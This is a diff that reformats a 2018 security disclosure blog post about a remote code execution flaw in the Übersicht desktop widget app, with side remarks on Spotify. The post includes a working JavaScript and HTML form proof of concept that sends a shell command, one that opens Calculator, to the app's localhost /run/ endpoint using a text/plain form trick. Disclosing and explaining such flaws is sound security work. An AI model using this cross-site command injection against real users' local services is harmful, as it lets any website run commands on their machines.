@@ -1,7 +1,19 @@
-```
+---
+title: 'Übersicht Remote Code Execution, Spotify takeover'
+date:
+  - 15
+  - dec
+  - 2018
+tags:
+  - disclosure
+  - writing
+language: en-GB
+subtitle: 'on the security implications of locally hosted web services'
+---
+
 # Übersicht Remote Code Execution, Spotify takeover
 
-on the security implications of locally hosted web services
+On the security implications of locally hosted web services
 
 I try to bring this up whenever I have the chance to talk about application security architecture: the way we think about networks as boundaries is useful, but inadequate in 2018 and this has serious implications for how we design our apps.
 
@@ -9,7 +21,9 @@ The unfortunate poster child I’m using to contextualise this is übersicht, a 
 
 Übersicht like many applications these days is essentially a web browser running web apps with special privileges. One of these privileges is being able to run commands on your computer. Webapp widgets are run on a locally hosted website only accessible by the user’s computer. I’m sorry. I just got word this article is about Spotify too. Let’s pause for a moment and talk about that.
 
-![this blew my mind in 2007](https://cdn-images-1.medium.com/max/2200/0*7blXAjfwb4BJX57h.png)
+import rainmeter from '#root/mdx/article/2018/rainmeter.png'
+
+<Image.default alt="this blew my mind in 2017" src={rainmeter}/>
 
 ## I ⧸ Spotify’s All Singing, All Dancing Musical Backdoor
 
@@ -119,55 +133,61 @@ When you load 127.0.0.1:41416 you actually get the Übersicht interface that’s
 
 Writing my own overplayed desktop tchatche, I was exploring what stuff I was allowed to hook into, which is defined in [this file](https://github.com/felixhageloh/uebersicht/blob/bbba0f08defc90496238bcb9c7233c41c86ae70c/server/src/uebersicht.js#L5), like this:
 
+```javascript
 import run from './runShellCommand';
 import request from 'superagent';
 import styled, {css} from 'react-emotion';
 
 export {run, request, css, styled};
+```
 
 Ok, did that just say ‘run shell command’? I can have my widget update itself by running a command on my computer? Hell Yes!
 
 Wait, what does runShellCommand actually do? It turns out, not a whole lot:
 
-    const post = require('superagent').post;
+```javascript
+const post = require('superagent').post;
 
-    function wrapError(err, res) {
-      return err
-        ? new Error((res || {}).text || 'error running command')
-        : null
-        ;
-    }
+function wrapError(err, res) {
+	return err
+	? new Error((res || {}).text || 'error running command')
+	: null
+	;
+}
 
-    module.exports = function runShellCommand(command, callback) {
-      const request = post('/run/').send(command);
-      return callback
-        ? request.end((err, res) => callback(wrapError(err, res), (res || {}).text))
-        : request
-          .catch(err => { throw wrapError(err, err.response); })
-          .then(res => res.text)
-        ;
-    };
+module.exports = function runShellCommand(command, callback) {
+	const request = post('/run/').send(command);
+	return callback
+	? request.end((err, res) => callback(wrapError(err, res), (res || {}).text))
+	: request
+		.catch(err => { throw wrapError(err, err.response); })
+		.then(res => res.text)
+	;
+};
+```
 
 So… we… just make a request to [https://127.0.0.1:41416/run,](https://127.0.0.1:41416/run,) and send whatever we want it to do? Neato. Haven’t we learned at this point that anyone can make a request to 127.0.0.1, though?
 
 They can, with a little hacking, some javascript, and a custom website:
 
-    const [form, input] = ["form", "input"].map(document.createElement.bind(document));
+```javascript
+const [form, input] = ["form", "input"].map(document.createElement.bind(document));
 
-    Object.entries({
-      method: "POST",
-      action: "[http://127.0.0.1:41416/run/](http://127.0.0.1:41416/run/)",
-      enctype: "text/plain"
-    }).forEach(([key, value]) => form.setAttribute(key, value))
+Object.entries({
+	method: "POST",
+	action: "[http://127.0.0.1:41416/run/](http://127.0.0.1:41416/run/)",
+	enctype: "text/plain"
+}).forEach(([key, value]) => form.setAttribute(key, value))
 
-    Object.entries({
-      value: "nope",
-      name: "open /Applications/Calculator.app #"
-    }).forEach(([key, value]) => input.setAttribute(key, value))
+Object.entries({
+	value: "nope",
+	name: "open /Applications/Calculator.app #"
+}).forEach(([key, value]) => input.setAttribute(key, value))
 
-    document.body.appendChild(form).appendChild(input);
+document.body.appendChild(form).appendChild(input);
 
-    form.submit();
+form.submit();
+```
 
 First, I apologise for writing my code in ES6 Javascript, which has a similar effect on legacy Javascript programmers to speaking to an Englishman in old English.
 
@@ -175,9 +195,11 @@ First, I apologise for writing my code in ES6 Javascript, which has a similar ef
 
 I’m just making an HTML form in Javascript, the code of which looks like this, and should be easier to understand:
 
-    <form method="POST" action="[http://127.0.0.1:41416/run/](http://127.0.0.1:41416/run/)" enctype="text/plain">
-       <input value="nope" name="open/Applications/Calculator.app#">
-    </form>
+```html
+<form method="POST" action="[http://127.0.0.1:41416/run/](http://127.0.0.1:41416/run/)" enctype="text/plain">
+	<input value="nope" name="open/Applications/Calculator.app#">
+</form>
+```
 
 You might look at all this and think ‘wow, this really isn’t as simple as they did it in Übersicht’. And you’d be right. Remember when I mentioned websites can make requests to each other with *‘several extremely technical and complicated caveats’*? This is the product of those caveats.
 
@@ -189,27 +211,27 @@ A web (HTTP) request is actually a super simple thing. Two people could type to 
 
 ![](https://cdn-images-1.medium.com/max/2000/1*_sKBhIfMrwPt10GkPwN2nA.png)
 
-We only care about the bits starting with ‘>’ or ‘<’, which indicate sending or receiving.
+We only care about the bits starting with ‘`>`’ or ‘`<`’, which indicate sending or receiving.
 
-    $ curl -sv '[http://oh.no.ms'](http://oh.no.ms') | head
-    > GET / HTTP/1.1
-    > Host: oh.no.ms
-    > User-Agent: curl/7.58.0
-    > Accept: */*
-    >
-    < HTTP/1.1 200 OK
-    < x-amz-id-2: [scrubbed]
-    < x-amz-request-id: [scrubbed]
-    < Date: Sat, 15 Dec 2018 21:37:53 GMT
-    < Last-Modified: Thu, 11 Aug 2016 22:37:02 GMT
-    < ETag: "d8c9ff35acce7d64ff9b6bf9af1faef2"
-    < Content-Type: text/html
-    < Content-Length: 1618
-    < Server: AmazonS3
-    <
-    { [1618 bytes data]
-    * Connection #0 to host oh.no.ms left intact
-    <!DOCTYPE HTML>
+>   $ curl -sv '[http://oh.no.ms'](http://oh.no.ms') | head
+>   > GET / HTTP/1.1
+>   > Host: oh.no.ms
+>   > User-Agent: curl/7.58.0
+>   > Accept: */*
+>   >
+>   ← HTTP/1.1 200 OK
+>   ← x-amz-id-2: [scrubbed]
+>   ← x-amz-request-id: [scrubbed]
+>   ← Date: Sat, 15 Dec 2018 21:37:53 GMT
+>   ← Last-Modified: Thu, 11 Aug 2016 22:37:02 GMT
+>   ← ETag: "d8c9ff35acce7d64ff9b6bf9af1faef2"
+>   ← Content-Type: text/html
+>   ← Content-Length: 1618
+>   ← Server: AmazonS3
+>   ←
+>   ← [1618 bytes data]
+>   * Connection #0 to host oh.no.ms left intact
+>   {"<!DOCTYPE HTML>"}
 
 This first bit is us saying ‘give us resource / via HTTP 1.1’. Where we saw ‘/run’ before, the ‘/’ would be ‘/run’. Then we have some information on what we’re looking for in the so-called ‘header’ colon-separated format. It says that we’re looking for the website ‘oh.no.ms’, we’re using the ‘web browser’ cURL and we’ll accept anything you give us.
 
@@ -217,47 +239,50 @@ Then, the web server comes back and says, OK. I have it, here’s some data abou
 
 The request can also have a body. In fact, when we do a POST request like Übersicht, we have a request body, like this:
 
-    curl '[http://oh.no.ms'](http://oh.no.ms') -vvs -X POST -d 'param1=cool beans&param2=cooler beans' | h
-    ead
-    * Rebuilt URL to: [http://oh.no.ms/](http://oh.no.ms/)
-    *   Trying 52.218.80.156...
-    * TCP_NODELAY set
-    * Connected to oh.no.ms (52.218.80.156) port 80 (#0)
-    > POST / HTTP/1.1
-    > Host: oh.no.ms
-    > User-Agent: curl/7.58.0 */}
-    > Accept: */*
-    {/*
-    > Content-Length: 37
-    > Content-Type: application/x-www-form-urlencoded
-    >
-    > param1=cool%20beans&param2=cooler%20beans
-    < HTTP/1.1 405 Method Not Allowed
-    < x-amz-request-id: [scrubbed]
-    < x-amz-id-2: [scrubbed]
-    < Allow: GET, HEAD, OPTIONS
-    < Content-Type: text/html; charset=utf-8
-    < Content-Length: 422
-    < Date: Sat, 15 Dec 2018 21:46:55 GMT
-    < Server: AmazonS3
-    <
+>   curl '[http://oh.no.ms'](http://oh.no.ms') -vvs -X POST -d 'param1=cool beans&param2=cooler beans' | h
+>   ead
+>   * Rebuilt URL to: [http://oh.no.ms/](http://oh.no.ms/)
+>   *   Trying 52.218.80.156...
+>   * TCP_NODELAY set
+>   * Connected to oh.no.ms (52.218.80.156) port 80 (#0)
+>   > POST / HTTP/1.1
+>   > Host: oh.no.ms
+>   > User-Agent: curl/7.58.0 */}
+>   > Accept: */*
+>
+>   > Content-Length: 37
+>   > Content-Type: application/x-www-form-urlencoded
+>   >
+>   > param1=cool%20beans&param2=cooler%20beans
+>   ← HTTP/1.1 405 Method Not Allowed
+>   ← x-amz-request-id: [scrubbed]
+>   ← x-amz-id-2: [scrubbed]
+>   ← Allow: GET, HEAD, OPTIONS
+>   ← Content-Type: text/html; charset=utf-8
+>   ← Content-Length: 422
+>   ← Date: Sat, 15 Dec 2018 21:46:55 GMT
+>   ← Server: AmazonS3
 
 Here we send two parameters via standard POST. A ‘param1’ which is ‘cool beans’ and a ‘param2’ which is ‘cooler beans’. We tell the server that we have body content, its length is 37 (bytes / ASCII letters), and the format of our body content is ‘application/x-www-form-urlencoded’. Then our *request body* is the ‘URL Encoded’ form of our parameters, with ‘%20’ to indicate spaces.
 
 This is a typical, old-timey request that you can make with an HTML form, the equivalent form of which would be:
 
-    <form action="[http://oh.no.ms](http://oh.no.ms)" method="POST">
-     <input name="param1" value="cool beans">
-     <input name="param2" value="cooler beans">
-    </form>
+```html
+<form action="http://oh.no.ms" method="POST">
+	<input name="param1" value="cool beans">
+	<input name="param2" value="cooler beans">
+</form>
+```
 
 With this old type of request, any website can make a request to any other, but when the ability to write Javascript that makes requests to other places came around it brought with it additional protections and abilities. One of these is having a custom request body, which can be anything. In the case of the code Übersicht used, there’s a request body which is just the command to be sent.
 
 This is hard to achieve through a typical HTML form, because HTML forms always send data via their standard format. Let’s say we tried this, for example:
 
-    <form action="http://127.0.0.1:41416" method="POST">
-     <input name="run" value="open /Applications/Calculator.app">
-    </form>
+```html
+<form action="http://127.0.0.1:41416" method="POST">
+	<input name="run" value="open /Applications/Calculator.app">
+</form>
+```
 
 That generates a request body that looks like this:
 
@@ -265,9 +290,11 @@ That generates a request body that looks like this:
 
 Übersicht does nothing when you send it this, because there’s no program called ‘run=open+%2FApplications%2FCalculator.app’. We need to take special drastic measures.
 
-    <form method="POST" action="[http://127.0.0.1:41416/run/](http://127.0.0.1:41416/run/)" enctype="text/plain">
-       <input name="open /Applications/Calculator.app #" value="nope">
-    </form>
+```html
+<form method="POST" action="[http://127.0.0.1:41416/run/](http://127.0.0.1:41416/run/)" enctype="text/plain">
+	<input name="open /Applications/Calculator.app #" value="nope">
+</form>
+```
 
 First, we specify enctype="text/plain" . This indicates that we *don’t* want our form data URL Encoded. Next, we add our command as the ‘name’, and a ‘#’ to the end. In the shell ‘#’ is a comment, and everything past it is ignored. So we send open /Applications/Calculator.app #=nope .
 
